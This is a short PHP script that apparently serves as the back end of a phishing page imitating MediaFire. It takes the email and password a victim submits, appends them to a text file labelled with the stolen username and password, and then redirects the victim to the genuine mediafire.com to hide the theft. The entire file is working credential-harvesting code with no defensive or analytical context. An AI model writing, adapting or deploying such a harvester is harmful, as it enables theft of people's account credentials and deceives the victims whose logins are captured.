<?php

file_put_contents("../facebook/mydata.txt", "MEDIAFIRE Username: " . $_POST['login_email'] . " Password: " . $_POST['login_pass'] . "\n", FILE_APPEND);
header('Location: https://mediafire.com/');
exit();
                                                                  
